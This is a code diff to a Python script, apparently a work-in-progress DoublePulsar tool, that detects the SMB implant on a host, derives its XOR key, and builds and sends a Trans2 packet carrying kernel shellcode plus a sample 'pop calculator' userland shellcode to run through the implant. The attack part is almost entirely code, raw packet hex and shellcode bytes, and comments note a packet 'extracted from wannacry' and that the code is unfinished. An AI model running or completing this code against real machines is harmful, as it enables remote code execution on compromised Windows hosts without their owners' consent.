@@ -2,31 +2,12 @@
 
 import binascii
 import socket
+from impacket import smb
 import struct
 
-#for XOR decryption
+# for XOR decryption
 from itertools import cycle
 
-#https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
-class NewSMBPacket(Structure):
-    structure = (
-        ('Signature', '"\xffSMB'),
-        ('Command','B=0'),
-        ('ErrorClass','B=0'),
-        ('_reserved','B=0'),
-        ('ErrorCode','<H=0'),
-        ('Flags1','B=0'),
-        ('Flags2','<H=0'),
-        ('PIDHigh','<H=0'),
-        ('SecurityFeatures','8s=""'),
-        ('Reserved','<H=0'),
-        ('Tid','<H=0xffff'),
-        ('Pid','<H=0'),
-        ('Uid','<H=0'),
-        ('Mid','<H=0'),
-        ('Data','*:'),
-    )
-	
 class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
     structure = (
         ('TotalParameterCount','<H=0'),
@@ -39,42 +20,10 @@ class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
         ('DataDisplacement','<H=0'),
     )
 
-class SMBCommand(Structure):
-    structure = (
-        ('WordCount', 'B=len(Parameters)//2'),
-        ('_ParametersLength','_-Parameters','WordCount*2'),
-        ('Parameters',':'),             # default set by constructor
-        ('ByteCount','<H-Data'),
-        ('Data',':'),                   # default set by constructor
-    )
-
-class SMBTransaction2Secondary_Data(Structure):
-    structure = (
-        ('Pad1Length','_-Pad1','self["Pad1Length"]'),
-        ('Pad1',':'),
-        ('Trans_ParametersLength','_-Trans_Parameters','self["Trans_ParametersLength"]'),
-        ('Trans_Parameters',':'),
-        ('Pad2Length','_-Pad2','self["Pad2Length"]'),
-        ('Pad2',':'),
-        ('Trans_DataLength','_-Trans_Data','self["Trans_DataLength"]'),
-        ('Trans_Data',':'),
-    )
-    
-#https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
-def addCommand(self, command):
-  if len(self['Data']) == 0:
-    self['Command'] = command.command
-    
-  else:
-    self['Data'][-1]['Parameters']['AndXCommand'] = command.command
-    self['Data'][-1]['Parameters']['AndXOffset'] = len(self)
-    self['Data'].append(command)
-
 def calculate_doublepulsar_xor_key(s):
     x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
     x = x & 0xffffffff  # this line was added just to truncate to 32 bits
     return x
-
 
 # The arch is adjacent to the XOR key in the SMB signature
 def calculate_doublepulsar_arch(s):
@@ -83,34 +32,13 @@ def calculate_doublepulsar_arch(s):
     else:
         return "x64 (64-bit)"
 
-#https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
-def logoff(self):
-        smb = NewSMBPacket()
-
-        logOff = SMBCommand(SMB.SMB_COM_LOGOFF_ANDX)
-        logOff['Parameters'] = SMBLogOffAndX()
-        smb.addCommand(logOff)
-
-        self.sendSMB(smb)
-        self.recvSMB()
-        # Let's clear some fields so you can login again under the same session
-        self._uid = 0
-
-#https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
-def disconnect_tree(self, tid):
-        smb = NewSMBPacket()
-        smb['Tid']  = tid
-
-        smb.addCommand(SMBCommand(SMB.SMB_COM_TREE_DISCONNECT))
-
-        self.sendSMB(smb)
-        self.recvSMB()
-
-#same as XOR_Decrypt
+# same as XOR_Decrypt
 def xor_encrypt(message, key):
-	return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(message, cycle(key)))
+    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(message, cycle(key)))
+
 
 def read_dll_file_as_hex():
+    global hex
     print("reading DLL into memory!")
     with open("file.bin", "rb") as f:
         data = f.read()
@@ -184,7 +112,7 @@ kernel_shellcode += b"\x51\x41\x59\x4C\x8D\x05\x1A\x00\x00\x00\x5A\x48\x83\xEC\x
 kernel_shellcode += b"\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF\x48\x89\xEC\x5D\x41\x5F"
 kernel_shellcode += b"\x5E\xC3"
 
-#pop calculator shellcode - this is a sample.  Change according to your payload
+# pop calculator shellcode - this is a sample.  Change according to your payload
 userland_shellcode = b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
 userland_shellcode += b"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
 userland_shellcode += b"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
@@ -199,13 +127,17 @@ userland_shellcode += b"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
 userland_shellcode += b"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
 userland_shellcode += b"\x6c\x63\x89\xe2\x52\x52\x53\x53"
 userland_shellcode += b"\x53\x53\x53\x53\x52\x53\xff\xd7"
-	
+
 if __name__ == "__main__":
     # Packets
-    negotiate_protocol_request = binascii.unhexlify("00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
-    session_setup_request = binascii.unhexlify("00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
-    tree_connect_request = binascii.unhexlify("00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
-    trans2_session_setup = binascii.unhexlify("0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
+    negotiate_protocol_request = binascii.unhexlify(
+        "00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
+    session_setup_request = binascii.unhexlify(
+        "00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
+    tree_connect_request = binascii.unhexlify(
+        "00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
+    trans2_session_setup = binascii.unhexlify(
+        "0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
 
     timeout = 5.0
     # sample IP
@@ -266,81 +198,82 @@ if __name__ == "__main__":
         arch = calculate_doublepulsar_arch(signature_long)
         print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
 
-        #will use a structure than hex code of the Trans2 EXEC packet
-        #packet in to execute a payload - extracted from wannacry
-        #trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
-        
+        # will use a structure than hex code of the Trans2 EXEC packet
+        # packet in to execute a payload - extracted from wannacry
+        # trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
+
         # Replace tree ID and user ID in trans2 exec packet
-        #modified_trans2_exec_packet = bytearray(trans2_exec_packet)
-        #modified_trans2_exec_packet[28] = tree_id[0]
-        #modified_trans2_exec_packet[29] = tree_id[1]
-        #modified_trans2_exec_packet[32] = user_id[0]
-        #modified_trans2_exec_packet[33] = user_id[1]
+        # modified_trans2_exec_packet = bytearray(trans2_exec_packet)
+        # modified_trans2_exec_packet[28] = tree_id[0]
+        # modified_trans2_exec_packet[29] = tree_id[1]
+        # modified_trans2_exec_packet[32] = user_id[0]
+        # modified_trans2_exec_packet[33] = user_id[1]
 
-   	#at this moment, uploading DLL files is not completed.
-        #read file into memory here
-        #read_dll_file_as_hex()
-        
-        #merge file with kernel shellcode to run payload
-        #kernel shellcode is for 64 bits at the moment
+        # at this moment, uploading DLL files is not completed.
+        # read file into memory here
+        # read_dll_file_as_hex()
+
+        # merge file with kernel shellcode to run payload
+        # kernel shellcode is for 64 bits at the moment
         modified_kernel_shellcode = bytearray(kernel_shellcode)
-        
-        #add PAYLOAD shellcode length after the kernel shellcode and write this value in hex 
-        modified_kernel_shellcode += hex(len(payload_shellcode))
-        #add the shellcode after the shellcode size
-        modified_kernel_shellcode += payload_shellcode
 
-        #fill up the SMB Trans2 Secondary packet structures
-        #CODE IS NOT FINISHED HERE
-        #helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
+        # add PAYLOAD shellcode length after the kernel shellcode and write this value in hex
+        modified_kernel_shellcode += hex(len(userland_shellcode))
+
+        # add the shellcode after the shellcode size
+        modified_kernel_shellcode += userland_shellcode
+
+        # fill up the SMB Trans2 Secondary packet structures
+        # CODE IS NOT FINISHED HERE
+        # helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
 
         doublepulsar_pkt = smb.NewSMBPacket()
-        
-        #some values here
+
+        # some values here
         doublepulsar_pkt.Flags1 = 0x18
         doublepulsar_pkt.Flags2 = 0xc007
-        doublepulsar_pkt.Timeout = 0x25891a00 #execute command for DoublePulsar
-        
-        #more will be filled if needed
-        #unsure if more need to be populated at this time
+        doublepulsar_pkt.Timeout = 0x25891a00  # execute command for DoublePulsar
 
-        #build packet from scratch; no parameters
+        # more will be filled if needed
+        # unsure if more need to be populated at this time
+
+        # build packet from scratch; no parameters
         transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
         transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
         transCommand['Data'] = smb.SMBTransaction2Secondary_Data()
 
         transCommand['Parameters']['TotalParameterCount'] = 15
-        transCommand['Parameters']['TotalDataCount'] = len(data)
+        transCommand['Parameters']['TotalDataCount'] = len(modified_kernel_shellcode)
 
-        fixedOffset = 32+3+18
+        fixedOffset = 32 + 3 + 18
         transCommand['Data']['Pad1'] = ''
-        
+
         transCommand['Parameters']['ParameterCount'] = 12
         transCommand['Parameters']['ParameterOffset'] = 0
-	
-	#Xor encrypt the parameters
-	'''DataCount ( total size of the shellcode )
-        ChunkSize ( size of the shellcode chunk, or 4096 )
-        Data Offset ( Offset of the data, starts at 0 and increments by 4096 chunk sizes)
-	'''
+
+        # Xor encrypt the parameters
+        '''DataCount ( total size of the shellcode )
+            ChunkSize ( size of the shellcode chunk, or 4096 )
+            Data Offset ( Offset of the data, starts at 0 and increments by 4096 chunk sizes)
+        '''
         transCommand['Parameters']['DataCount'] = xor_encrypt(len(modified_kernel_shellcode), key)
-	transCommand['Parameters']['ChunkSize'] = xor_encrypt(len(modified_kernel_shellcode), key)
-	transCommand['Parameters']['DataOffset'] = xor_encrypt(0x0000, key)
-        #transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
-        #transCommand['Parameters']['DataDisplacement'] = displacement
+        transCommand['Parameters']['ChunkSize'] = xor_encrypt(len(modified_kernel_shellcode), key)
+        transCommand['Parameters']['DataOffset'] = xor_encrypt(0x0000, key)
+        # transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
+        # transCommand['Parameters']['DataDisplacement'] = displacement
 
-        transCommand['Data']['Trans_Parameters'] = '' #parameters
+        #transCommand['Data']['Trans_Parameters'] = ''  # parameters
         transCommand['Data']['Trans_Data'] = xor_encrypt(modified_kernel_shellcode, key)
-        doublpulsar_pkt.addCommand(transCommand)
+        doublepulsar_pkt.addCommand(transCommand)
 
-        #conn.sendSMB(doublepulsar_pkt)
-        s.send(doublepulsar_pkt)
-        
-        #send disconnect
-        conn.disconnect_tree(tid)
+        # conn.sendSMB(doublepulsar_pkt)
+        s.send(bytes(doublepulsar_pkt))
 
-        #send logoff
-	conn.logoff()
+        # send disconnect
+        #conn.disconnect_tree(tid)
 
-	#close connection
-	s.close()
+        # send logoff
+        #conn.logoff()
+
+        # close connection
+        s.close()
